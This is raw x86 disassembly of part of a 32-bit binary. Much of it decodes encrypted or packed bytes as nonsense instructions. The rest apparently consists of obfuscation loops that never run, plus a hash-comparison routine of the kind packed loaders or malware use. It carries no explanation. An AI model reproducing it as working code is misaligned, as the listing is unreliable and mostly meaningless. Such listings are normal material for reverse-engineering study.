  40ea8c:	inc    eax
  40ea8d:	xor    al,dh
  40ea8f:	mov    ebx,0x74ed0ac7
  40ea94:	loopne 0x40ea22
  40ea96:	push   es
  40ea97:	inc    ebp
  40ea98:	sbb    al,0xf0
  40ea9a:	or     BYTE PTR [eax+edi*4+0x9a31a5],bl
  40eaa1:	lea    edi,ds:0x11f003fa
  40eaa7:	or     ebp,DWORD PTR [esi+edi*1]
  40eaaa:	pop    edi
  40eaab:	mov    eax,ds:0x335f21e6
  40eab0:	jmp    0xb5e0:0x25edfc9e
  40eab7:	out    0x5a,al
  40eab9:	or     ebx,esp
  40eabb:	push   ebp
  40eabc:	ficomp WORD PTR [esi]
  40eabe:	push   ebx
  40eabf:	add    dl,bh
  40eac1:	add    eax,ebx
  40eac3:	pop    ebx
  40eac4:	leave  
  40eac5:	ret    0x8
  40eac8:	push   ebp
  40eac9:	mov    ebp,esp
  40eacb:	push   ecx
  40eacc:	mov    DWORD PTR ds:0x433693,0x1f
  40ead6:	cmp    DWORD PTR ds:0x433693,0x0
  40eadd:	je     0x40eb79
  40eae3:	cmp    DWORD PTR ds:0x433693,0xc
  40eaea:	jne    0x40eafe
  40eaf0:	push   0x1b35
  40eaf5:	push   DWORD PTR [ebp-0x14]
  40eaf8:	call   DWORD PTR ds:0x412368
  40eafe:	cmp    DWORD PTR ds:0x433693,0xd
  40eb05:	jne    0x40eb18
  40eb0b:	mov    edx,DWORD PTR ds:0x433693
  40eb11:	dec    edx
  40eb12:	mov    DWORD PTR ds:0x433693,edx
  40eb18:	mov    edx,DWORD PTR ds:0x433693
  40eb1e:	dec    edx
  40eb1f:	mov    DWORD PTR ds:0x433693,edx
  40eb25:	jmp    0x40ead6
  40eb2a:	mov    DWORD PTR ds:0x4336d3,0x16
  40eb34:	cmp    DWORD PTR ds:0x4336d3,0x0
  40eb3b:	je     0x40eb79
  40eb41:	cmp    DWORD PTR ds:0x4336d3,0x17
  40eb48:	jne    0x40eb5f
  40eb4e:	push   DWORD PTR [ebp-0x14]
  40eb51:	push   DWORD PTR [ebp-0xc]
  40eb54:	push   0x495a
  40eb59:	call   DWORD PTR ds:0x4120ec
  40eb5f:	mov    eax,ds:0x4336d3
  40eb64:	dec    eax
  40eb65:	mov    ds:0x4336d3,eax
  40eb6a:	jmp    0x40eb34
  40eb6f:	mov    DWORD PTR ds:0x4336e3,0x352
  40eb79:	push   ecx
  40eb7a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40eb81:	sbb    DWORD PTR ds:0x43369b,edx
  40eb87:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40eb8e:	mov    eax,DWORD PTR [ebp-0x4]
  40eb91:	push   esi
  40eb92:	add    DWORD PTR ds:0x43372b,ebx
  40eb98:	mov    esi,DWORD PTR [ebp-0x8]
  40eb9b:	adc    ecx,edx
  40eb9d:	mov    edx,0x7510854
  40eba2:	jmp    0x40ed99
  40eba7:	imul   ebx,DWORD PTR [ebx+0x72cf420f],0x73
  40ebae:	mov    bl,0xda
  40ebb0:	jecxz  0x40eb5f
  40ebb2:	sbb    al,bl
  40ebb4:	xor    eax,0xa59a8827
  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40eb7c
  40ebc0:	push   es
  40ebc1:	cwde   
  40ebc2:	xchg   BYTE PTR [ebx],ch
  40ebc4:	jmp    0x40eb47
  40ebc6:	fdivr  QWORD PTR [esi-0x3edecfdd]
  40ebcc:	pop    esp
  40ebcd:	ror    BYTE PTR [edi],0x99
  40ebd0:	sub    al,0xa2
  40ebd2:	add    eax,0xbb87742e
  40ebd7:	push   ebx
  40ebd8:	jns    0x40eb94
  40ebda:	mov    dh,0xdc
  40ebdc:	xchg   bl,dh
  40ebde:	inc    ebp
  40ebdf:	dec    ebp
  40ebe0:	in     eax,dx
  40ebe1:	jmp    0xddf886d6
  40ebe6:	mov    DWORD PTR [edx-0x68],ebx
  40ebe9:	icebp  
  40ebea:	stos   DWORD PTR es:[edi],eax
  40ebeb:	and    eax,DWORD PTR [edx]
  40ebed:	adc    eax,0x15604e58
  40ebf2:	outs   dx,BYTE PTR ds:[esi]
  40ebf3:	es fs xchg edx,ecx
  40ebf7:	stos   BYTE PTR es:[edi],al
  40ebf8:	pop    ebp
  40ebf9:	ds xchg ecx,eax
  40ebfb:	loop   0x40ec29
  40ebfd:	inc    ecx
  40ebfe:	pop    ebx
  40ebff:	push   ecx
  40ec00:	xor    DWORD PTR [esi],0xffffff91
  40ec03:	xchg   dl,cl
  40ec05:	add    esi,DWORD PTR [edi+ebp*2-0x2a]
  40ec09:	or     bh,cl
  40ec0b:	scas   al,BYTE PTR es:[edi]
  40ec0c:	retf   
  40ec0d:	cmp    BYTE PTR [ebx-0xabd4b91],0x6b
  40ec14:	push   0x3f
  40ec16:	mov    ah,0x5e
  40ec18:	jmp    0xe121:0xef9f0276
  40ec1f:	fwait
  40ec20:	mov    dh,0xe4
  40ec22:	sub    eax,0xc078415d
  40ec27:	jle    0x40ebc9
  40ec29:	cld    
  40ec2a:	rol    DWORD PTR [esi+edx*1-0x74],cl
  40ec2e:	retf   0x5929
  40ec31:	xor    edx,DWORD PTR [ebx+0x31ff958]
  40ec37:	xchg   esp,eax
  40ec38:	iret   
  40ec39:	inc    esp
  40ec3a:	mov    BYTE PTR [ebx],al
  40ec3c:	lods   eax,DWORD PTR ds:[esi]
  40ec3d:	(bad)  
  40ec3e:	xor    esp,ecx
  40ec40:	xor    BYTE PTR [edi-0x606c4f45],ah
  40ec46:	lock (bad) 
  40ec49:	in     eax,0xc8
  40ec4b:	pop    eax
  40ec4c:	sub    al,ch
  40ec4e:	mov    ecx,0x5607a515
  40ec53:	xchg   ebx,eax
  40ec54:	gs (bad) 
  40ec56:	jmp    0xb352:0x7002737c
  40ec5d:	fimul  WORD PTR [esi]
  40ec5f:	xchg   DWORD PTR [edx+0x10],ecx
  40ec62:	sar    BYTE PTR [ebx],0x5d
  40ec65:	mov    al,ds:0x48366739
  40ec6a:	aas    
  40ec6b:	adc    BYTE PTR [esi+ecx*8],dl
  40ec6e:	outs   dx,DWORD PTR ds:[esi]
  40ec6f:	js     0x40ec75
  40ec71:	and    eax,0x4ca6aa5d
  40ec76:	push   ebp
  40ec77:	je     0x40ecea
  40ec79:	(bad)  
  40ec7a:	rcr    bl,cl
  40ec7c:	add    BYTE PTR [ecx],ch
  40ec7e:	mov    dh,0xe4
  40ec80:	jnp    0x40ec3e
  40ec82:	(bad)  
  40ec83:	and    esp,DWORD PTR [edx+0x6a]
  40ec86:	push   cs
  40ec87:	stos   DWORD PTR es:[edi],eax
  40ec88:	xlat   BYTE PTR ds:[ebx]
  40ec89:	loop   0x40ec62
  40ec8b:	scas   al,BYTE PTR es:[edi]
  40ec8c:	outs   dx,BYTE PTR ds:[esi]
  40ec8d:	daa    
  40ec8e:	jo     0x40ed0a
  40ec90:	mov    bh,0x29
  40ec92:	xor    al,0x16
  40ec94:	test   edi,eax
  40ec96:	mov    ah,BYTE PTR [ebp+0x6f]
  40ec99:	ret    
  40ec9a:	stc    
  40ec9b:	jl     0x40ecc9
  40ec9d:	push   ss
  40ec9e:	jg     0x40ed00
  40eca0:	jge    0x40ed0b
  40eca2:	dec    edx
  40eca3:	out    0x22,al
  40eca5:	daa    
  40eca6:	push   es
  40eca7:	push   esp
  40eca8:	and    ecx,esp
  40ecaa:	mov    eax,DWORD PTR [ecx-0x1b2cd2a6]
  40ecb0:	ficom  WORD PTR [ecx]
  40ecb2:	xor    eax,0x6a9f7f91
  40ecb7:	add    edx,0xc200d90e
  40ecbd:	rol    DWORD PTR [edx-0x4],0x16
  40ecc1:	ret    
  40ecc2:	adc    ebx,DWORD PTR [eax+0x15213ab5]
  40ecc8:	mov    dh,0x93
  40ecca:	mov    al,0xfe
  40eccc:	js     0x40ec78
  40ecce:	aaa    
  40eccf:	es or  eax,0xd5169b04
  40ecd5:	jmp    0x331710e7
  40ecda:	adc    al,0x6
  40ecdc:	and    BYTE PTR cs:[ebx+0x56],ah
  40ece0:	xor    DWORD PTR [eax-0x3e9df5fe],esi
  40ece6:	mov    edx,0x4e905287
  40eceb:	sub    DWORD PTR ds:0xa087b283,ebp
  40ecf1:	retf   0x3cac
  40ecf4:	jne    0x40ec89
  40ecf6:	stos   BYTE PTR es:[edi],al
  40ecf7:	pop    ds
  40ecf8:	mov    ds:0xb89dc160,al
  40ecfd:	or     BYTE PTR [edi],al
  40ecff:	(bad)  
  40ed00:	aam    0x96
  40ed02:	retf   
  40ed03:	jns    0x40ec8a
  40ed05:	scas   eax,DWORD PTR es:[edi]
  40ed06:	sahf   
  40ed07:	push   es
  40ed08:	clc    
  40ed09:	dec    edi
  40ed0a:	xchg   ebx,eax
  40ed0b:	xor    cl,BYTE PTR [ebp-0x79]
  40ed0e:	jae    0x40ed46
  40ed10:	outs   dx,BYTE PTR ds:[esi]
  40ed11:	xor    eax,0xecaae753
  40ed16:	in     eax,dx
  40ed17:	sbb    BYTE PTR ds:0xf75bb59e,bl
  40ed1d:	or     ebp,DWORD PTR [esi-0x68]
  40ed20:	inc    edx
  40ed21:	(bad)  
  40ed23:	cmp    DWORD PTR [edx],ebp
  40ed25:	sbb    DWORD PTR [ebx],esi
  40ed27:	hlt    
  40ed28:	push   edx
  40ed29:	pop    ss
  40ed2a:	mov    DWORD PTR [ebp-0x50],edi
  40ed2d:	fidiv  DWORD PTR [eax+ebx*4-0x25]
  40ed31:	mov    dl,0xf
  40ed33:	mov    ch,0x20
  40ed35:	pop    ss
  40ed36:	sub    esi,DWORD PTR [ebp-0x37ef9f25]
  40ed3c:	lds    eax,FWORD PTR [esi+0x30]
  40ed3f:	jl     0x40edb6
  40ed41:	jmp    0x6ed1:0xe64e22b4
  40ed48:	xchg   BYTE PTR [ebx],al
  40ed4a:	sbb    BYTE PTR [ebp-0x6aad987c],cl
  40ed50:	xor    eax,0x9d167b8b
  40ed55:	sbb    edx,DWORD PTR [esi-0x5e]
  40ed58:	addr16 inc edx
  40ed5a:	inc    ebp
  40ed5b:	pop    eax
  40ed5c:	sbb    eax,0x4d6b67f
  40ed61:	cmp    esi,edi
  40ed63:	fdivr  DWORD PTR [edx-0xa6b135d]
  40ed69:	push   0x6e658932
  40ed6e:	rep lods eax,DWORD PTR ds:[esi]
  40ed70:	jmp    0x40ed8a
  40ed72:	sub    BYTE PTR [eax+0x3e99f9cd],bl
  40ed78:	repz mov esp,DWORD PTR [ebx+0x64fa07f8]
  40ed7f:	or     BYTE PTR [edi],ch
  40ed81:	pop    ss
  40ed82:	cdq    
  40ed83:	mov    al,0xb0
  40ed85:	cmp    al,0x7
  40ed87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed88:	repnz ror DWORD PTR [ebp-0x1b3e3671],cl
  40ed8f:	popf   
  40ed90:	mov    esi,0x9d801bc2
  40ed95:	popa   
  40ed96:	ja     0x40ed6b
  40ed98:	es xor eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x433653
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx+0x23087e1c]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	xchg   BYTE PTR [esi],ch
  40ee78:	pop    ebp
  40ee79:	clc    
  40ee7a:	inc    ecx
  40ee7b:	and    BYTE PTR [ecx],dh
  40ee7d:	cmp    eax,0xbe0423d8
  40ee82:	mov    bh,0x23
  40ee84:	jecxz  0x40eeb1
  40ee86:	adc    ch,BYTE PTR [esi+edx*2+0x5c]
  40ee8a:	fadd   st,st(6)
  40ee8c:	(bad)  
  40ee8d:	push   eax
  40ee8e:	jb     0x40ee64
  40ee90:	pop    esp
  40ee91:	sbb    al,0x7e
  40ee93:	ins    DWORD PTR es:[edi],dx
  40ee94:	out    0xb8,al
  40ee96:	ss xor ch,bh
  40ee99:	jmp    edi
  40ee9b:	in     eax,0xf2
  40ee9d:	xor    ch,BYTE PTR [ecx-0x36]
  40eea0:	mov    ds:0x8c77a1c7,eax
  40eea5:	add    al,0xbd
  40eea7:	ror    DWORD PTR [ebp+0x229389ee],0x49
  40eeae:	nop
  40eeaf:	scas   eax,DWORD PTR es:[edi]
  40eeb0:	shl    BYTE PTR [ebx+0x361d5a33],0x76
  40eeb7:	call   0xc9d4263f
  40eebc:	cmp    al,0x89
  40eebe:	pop    ss
  40eebf:	dec    ebx
  40eec0:	jl     0x40ee4f
  40eec2:	adc    edx,ebp
  40eec4:	call   0x2c321ce7
  40eec9:	push   ebp
  40eeca:	xchg   DWORD PTR [esi+0x52],esp
  40eecd:	inc    edx
  40eece:	sbb    esp,esi
  40eed0:	jle    0x40ef22
  40eed2:	sti    
  40eed3:	mov    bh,0x10
  40eed5:	test   al,0x27
  40eed7:	mov    ds:0x2dca98ce,al
  40eedc:	(bad)  
  40eedd:	arpl   di,bp
  40eedf:	fiadd  DWORD PTR [ebp+0x1c]
  40eee3:	add    DWORD PTR [ebx-0x6b],esp
  40eee6:	xor    bl,dh
  40eee8:	xor    ah,BYTE PTR [eax+0x2e]
  40eeeb:	add    DWORD PTR [edi-0x1d0d7df2],edi
  40eef1:	mov    esp,ebx
  40eef3:	repnz adc DWORD PTR [ebx+0x440b050d],eax
  40eefa:	test   BYTE PTR [edx-0x2d8b4ae7],0x19
  40ef01:	pop    ecx
  40ef02:	mov    ds:0x2a0f9a28,al
  40ef07:	inc    edx
  40ef08:	loopne 0x40ee9c
  40ef0a:	test   eax,0xb781cc80
  40ef0f:	aam    0xc2
  40ef11:	std    
  40ef12:	scas   al,BYTE PTR es:[edi]
  40ef13:	adc    al,0x1c
  40ef15:	push   es
  40ef16:	(bad)  
  40ef17:	jp     0x40ef4b
  40ef19:	dec    ebx
  40ef1a:	push   ds
  40ef1b:	jecxz  0x40ef5a
  40ef1d:	fwait
  40ef1e:	xor    DWORD PTR [edx-0x20],ecx
  40ef21:	mov    edi,0x3ee6aca0
  40ef26:	mov    ecx,0xa8524044
  40ef2b:	xchg   esi,eax
  40ef2c:	mov    dl,0xe3
  40ef2e:	pusha  
  40ef2f:	add    DWORD PTR [ecx-0x6],ebp
  40ef32:	in     al,dx
  40ef33:	add    BYTE PTR ds:0xa95839ca,cl
  40ef39:	outs   dx,BYTE PTR ds:[esi]
  40ef3a:	aad    0x76
  40ef3c:	jns    0x40ef0e
  40ef3e:	shl    BYTE PTR [eax],1
  40ef40:	cmp    eax,DWORD PTR [edx+esi*1]
  40ef43:	xchg   ecx,eax
  40ef44:	mov    es,WORD PTR [edi]
  40ef46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef47:	pop    es
  40ef48:	mov    BYTE PTR [ecx+0x61b88b35],bh
  40ef4e:	stos   BYTE PTR es:[edi],al
  40ef4f:	jno    0x40ef8f
  40ef51:	push   esp
  40ef52:	adc    al,BYTE PTR [ecx]
  40ef54:	rcl    BYTE PTR [edi+ecx*4+0x1cd5339f],1
  40ef5b:	or     al,0x34
  40ef5d:	outs   dx,DWORD PTR ds:[esi]
  40ef5e:	aaa    
  40ef5f:	or     DWORD PTR [edx],ebp
  40ef61:	xor    edi,DWORD PTR [edi+0xe638d8f]
  40ef67:	jl     0x40eef1
  40ef69:	es cs or dh,ch
  40ef6d:	ins    BYTE PTR es:[edi],dx
  40ef6e:	jnp    0x40ef61
  40ef70:	push   eax
  40ef71:	shr    DWORD PTR [ecx+0x35e89ae],1
  40ef77:	fwait
  40ef78:	cmp    cl,BYTE PTR [ecx-0x72cbd25c]
  40ef7e:	inc    ebp
  40ef7f:	cmc    
  40ef80:	(bad)  
  40ef81:	fisubr DWORD PTR [edi-0x23169063]
  40ef87:	stc    
  40ef88:	push   ecx
  40ef89:	sbb    DWORD PTR [edx],ecx
  40ef8b:	inc    esi
  40ef8c:	cmp    esp,DWORD PTR [ebx+0x6a]
  40ef8f:	dec    edi
  40ef90:	es daa 
  40ef92:	(bad)  
  40ef95:	mov    gs,WORD PTR [ebx+0x315c9079]
  40ef9b:	mov    ds:0xdb613b5b,eax
  40efa0:	dec    esi
  40efa1:	mov    esi,0xa4f53a92
  40efa6:	fdiv   DWORD PTR [ebx]
  40efa8:	cs dec ebx
  40efaa:	dec    ebp
  40efab:	inc    esp
  40efac:	sbb    BYTE PTR [ebp+0x68],dh
  40efaf:	(bad)  
  40efb1:	sbb    eax,0x7ad10a60
  40efb6:	retf   
  40efb7:	add    BYTE PTR [esi],bh
  40efb9:	jp     0x40ef45
  40efbb:	fdivr  DWORD PTR [ecx]
  40efbd:	out    dx,eax
  40efbe:	pop    ebx
  40efbf:	xlat   BYTE PTR ds:[ebx]
  40efc0:	jo     0x40f031
  40efc2:	mov    fs,WORD PTR [ecx+0x508f91be]
  40efc8:	jae    0x40ef6b
  40efca:	xchg   ebx,eax
  40efcb:	dec    ebx
  40efcc:	leave  
  40efcd:	mov    bh,0x2d
  40efcf:	daa    
  40efd0:	push   ebp
  40efd1:	dec    esi
  40efd2:	pop    ebx
  40efd3:	xchg   edx,eax
  40efd4:	xlat   BYTE PTR ds:[ebx]
  40efd5:	mov    ebx,?
  40efd7:	cmp    ch,BYTE PTR [esi-0x4f61c37f]
  40efdd:	and    eax,0x4a8881b
  40efe2:	pop    es
  40efe3:	pop    es
  40efe4:	(bad)  
  40efe5:	out    0xba,al
  40efe7:	(bad)  
  40efe8:	push   esp
  40efe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efea:	pop    ebx
  40efeb:	out    0x67,al
  40efed:	jl     0x40f047
  40efef:	in     al,dx
  40eff0:	xchg   ecx,eax
  40eff1:	clc    
  40eff2:	gs stc 
  40eff4:	ror    BYTE PTR [ebx],1
  40eff6:	and    al,0x39
  40eff8:	jmp    0x40f052
  40effa:	inc    esp
  40effb:	clc    
  40effc:	cld    
  40effd:	lds    eax,FWORD PTR [ecx]
  40efff:	out    0xb3,eax
  40f001:	xlat   BYTE PTR cs:[ebx]
  40f003:	ficom  DWORD PTR [esi+ecx*2+0x61]
  40f007:	aaa    
  40f008:	mov    dl,0x79
  40f00a:	cmc    
  40f00b:	rcl    DWORD PTR [ecx],0x1f
  40f00e:	ins    BYTE PTR es:[edi],dx
  40f00f:	lods   al,BYTE PTR ds:[esi]
  40f010:	fcom   DWORD PTR [ebp+0x4880af65]
  40f016:	inc    esp
  40f017:	jb     0x40efb2
  40f019:	iret   
  40f01a:	sahf   
  40f01b:	xchg   BYTE PTR [ebx+0x51dcbd8b],ch
  40f021:	sbb    DWORD PTR [ebp-0x4f5fe8c2],edx
  40f027:	xor    bh,ah
  40f029:	loopne 0x40f08c
  40f02b:	(bad)  
  40f02c:	pop    ebp
  40f02d:	jne    0x40efd2
  40f02f:	daa    
  40f030:	inc    edi
  40f031:	mov    eax,0xa7fe7970
  40f036:	add    ch,BYTE PTR [ebx-0x71]
  40f039:	mov    esi,0x89cce173
  40f03e:	pop    es
  40f03f:	repnz xor edx,DWORD PTR [edi+0x48]
  40f043:	dec    ebx
  40f044:	cdq    
  40f045:	adc    eax,0x13a4faa9
  40f04a:	xchg   ecx,eax
  40f04b:	mov    esi,0xb54a1498
  40f050:	mov    eax,DWORD PTR [ebp+0xc]
  40f053:	pop    esi
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x91eb1594,ebx
  40f076:	js     0x40f00c
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	ins    BYTE PTR es:[edi],dx
  40f081:	mov    WORD PTR [ebx],es
  40f083:	sub    ah,cl
  40f085:	xor    dh,BYTE PTR [edi-0x4f8cd930]
  40f08b:	test   eax,0x2cbc0387
  40f090:	pop    edx
  40f091:	adc    BYTE PTR [edx],ah
  40f093:	mov    ch,0x7c
  40f095:	mov    edi,DWORD PTR [ecx]
  40f097:	xlat   BYTE PTR ds:[ebx]
  40f098:	jl     0x40f0b7
  40f09a:	es ja  0x40f0b4
  40f09d:	fidiv  WORD PTR [ebx]
  40f09f:	dec    edx
  40f0a0:	push   0x1c8f71a1
  40f0a5:	test   edx,ecx
  40f0a7:	cmp    BYTE PTR [ecx-0x3a],ch
  40f0aa:	jae    0x40f06f
  40f0ac:	bound  esp,QWORD PTR [ecx+0x50e19fbe]
  40f0b2:	or     BYTE PTR [edi+0xc],bh
  40f0b5:	pop    edx
  40f0b6:	mov    ds:0x7daf7570,eax
  40f0bb:	push   es
  40f0bc:	retf   0xe13c
  40f0bf:	rcr    BYTE PTR [edi],cl
  40f0c1:	inc    eax
  40f0c2:	adc    al,0x47
  40f0c4:	and    ch,BYTE PTR [ecx+0x9]
  40f0c7:	push   esp
  40f0c8:	jmp    0x931982d7
  40f0cd:	jge    0x40f06d
  40f0cf:	sub    al,0x8e
  40f0d1:	in     eax,dx
  40f0d2:	aad    0x72
  40f0d4:	mov    dh,0x9d
  40f0d6:	lods   al,BYTE PTR ds:[esi]
  40f0d7:	iret   
  40f0d8:	adc    eax,0xa7f90ac8
  40f0dd:	inc    esp
  40f0de:	inc    edx
  40f0df:	in     al,0xf4
  40f0e1:	push   edi
  40f0e2:	and    eax,0xb29cc2d9
  40f0e7:	mov    esi,0xa5bc1187
  40f0ec:	pop    edi
  40f0ed:	sub    BYTE PTR [eax-0x4a],0x69
  40f0f1:	inc    eax
  40f0f2:	into   
  40f0f3:	push   0xfffffff3
  40f0f5:	mov    ds:0x3aa187c3,al
  40f0fa:	ret    
  40f0fb:	lock stc 
  40f0fd:	in     eax,0x2
  40f0ff:	xchg   esi,eax
  40f100:	lea    eax,[bx+si-0x6d]
  40f104:	xchg   DWORD PTR [ecx-0x21],esp
  40f107:	and    BYTE PTR [ebp-0x2b],bh
  40f10a:	and    eax,esp
  40f10c:	dec    esi
  40f10d:	xchg   esp,eax
  40f10e:	aad    0x3d
  40f110:	cmp    eax,0xeb8a9831
  40f115:	rol    BYTE PTR [eax],cl
  40f117:	std    
  40f118:	mov    al,0xb1
  40f11a:	or     BYTE PTR [esi+eiz*4-0x3ec395b9],0x99
  40f122:	push   0xb0d2ff75
  40f127:	pop    esp
  40f128:	dec    ecx
  40f129:	scas   al,BYTE PTR es:[edi]
  40f12a:	mov    esp,0x8de46d59
  40f12f:	xchg   edx,eax
  40f130:	aaa    
  40f131:	lea    esp,[esi+0xe]
  40f134:	xor    BYTE PTR [esi],bh
  40f136:	pop    esi
  40f137:	xchg   ebp,eax
  40f138:	ins    BYTE PTR es:[edi],dx
  40f139:	push   edi
  40f13a:	fisub  DWORD PTR [ebx+0x793919c9]
  40f140:	cli    
  40f141:	daa    
  40f142:	sub    DWORD PTR [edi-0x40],esp
  40f145:	(bad)  
  40f146:	dec    ebx
  40f147:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f148:	js     0x40f0f7
  40f14a:	sub    al,0x1c
  40f14c:	fcomp  DWORD PTR [edi]
  40f14e:	inc    edi
  40f14f:	sub    esi,DWORD PTR [edx-0x6c2e32b3]
  40f155:	test   al,0xb6
  40f157:	xor    eax,0x8a2e3919
  40f15c:	xor    BYTE PTR ds:0xa8fa46d8,dh
  40f162:	cmp    BYTE PTR [ebp-0x7],cl
  40f165:	push   esi
  40f166:	jmp    0xc5a3904f
  40f16b:	inc    edx
  40f16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f16d:	leave  
  40f16e:	daa    
  40f16f:	sub    ah,dl
  40f171:	aaa    
  40f172:	in     eax,0xc3
  40f174:	mov    ebx,0x61eee7dd
  40f179:	pop    esi
  40f17a:	ja     0x40f1d0
  40f17c:	pop    eax
  40f17d:	cmp    ebp,DWORD PTR [eax]
  40f17f:	sbb    DWORD PTR [ebx],ebp
  40f181:	add    al,0x93
  40f183:	jmp    0x519d49b6
  40f188:	ins    DWORD PTR es:[edi],dx
  40f189:	popa   
  40f18a:	pop    edi
  40f18b:	jg     0x40f111
  40f18d:	loope  0x40f1cf
  40f18f:	or     eax,0x33bf748a
  40f194:	jns    0x40f206
  40f196:	pop    edi
  40f197:	clc    
  40f198:	dec    eax
  40f199:	and    al,0xff
  40f19b:	xchg   ebx,eax
  40f19c:	out    dx,al
  40f19d:	enter  0x7860,0x1a
  40f1a1:	dec    ecx
  40f1a2:	push   edx
  40f1a3:	mov    edi,0xad30eb5d
  40f1a8:	je     0x40f1ee
  40f1aa:	nop
  40f1ab:	sbb    ch,BYTE PTR [ecx-0x5f]
  40f1ae:	pop    ss
  40f1af:	or     BYTE PTR [edi],0xbe
  40f1b2:	and    eax,0x5afb885d
  40f1b7:	and    DWORD PTR cs:[esi],0x8130fb83
  40f1be:	aaa    
  40f1bf:	xchg   BYTE PTR [edi-0x29],cl
  40f1c2:	sar    esi,0x9
  40f1c5:	mov    ebp,0xdc20f548
  40f1ca:	pop    eax
  40f1cb:	jo     0x40f1b3
  40f1cd:	out    dx,eax
  40f1ce:	mov    ebp,0x64e389c8
  40f1d3:	dec    esi
  40f1d4:	inc    ebp
  40f1d5:	out    0x5c,eax
  40f1d7:	cwde   
  40f1d8:	sub    dl,dl
  40f1da:	push   ss
  40f1db:	loop   0x40f224
  40f1dd:	inc    esi
  40f1de:	jl     0x40f1ad
  40f1e0:	pop    esp
  40f1e1:	mov    esi,0xbf4dc104
  40f1e6:	aas    
  40f1e7:	push   edx
  40f1e8:	push   es
  40f1e9:	adc    BYTE PTR [esi-0x27],ah
  40f1ec:	aaa    
  40f1ed:	sub    DWORD PTR [ecx-0x4dbcccd1],eax
  40f1f3:	cmp    DWORD PTR [eax+ebx*4-0x5ef0d770],esi
  40f1fa:	sub    cl,BYTE PTR [ecx+0x294db1c2]
  40f200:	push   esp
  40f201:	push   ss
  40f202:	mov    dh,0xc
  40f204:	fnop   
  40f206:	fld    DWORD PTR [edi-0x5cbf7862]
  40f20c:	(bad)  
  40f20d:	mov    ebp,0x53a82c0
  40f212:	imul   DWORD PTR [ecx+0xa]
  40f215:	pop    ecx
  40f216:	scas   al,BYTE PTR es:[edi]
  40f217:	mov    al,ds:0x77642d26
  40f21c:	xchg   ebx,eax
  40f21d:	jb     0x40f216
  40f21f:	call   0xb7385e02
  40f224:	jmp    0x24eb654b
  40f229:	lahf   
  40f22a:	rcl    DWORD PTR [eax+0x33],1
  40f22d:	(bad)  
  40f22e:	mov    eax,ds:0xc51a74c6
  40f233:	xchg   ecx,eax
  40f234:	xchg   edx,eax
  40f235:	sbb    DWORD PTR [eax-0x72],esi
  40f238:	jns    0x40f291
  40f23a:	mov    ds:0xd0c786e,al
  40f23f:	xor    eax,0xfa4890f7
  40f244:	inc    eax
  40f245:	loopne 0x40f246
  40f247:	pop    esi
  40f248:	call   0xa2a6e8f6
  40f24d:	cld    
  40f24e:	je     0x40f27e
  40f250:	int3   
  40f251:	cli    
  40f252:	mov    ds:0xdd444798,eax
  40f257:	stos   BYTE PTR es:[edi],al
  40f258:	call   DWORD PTR [eax]
  40f25a:	fwait
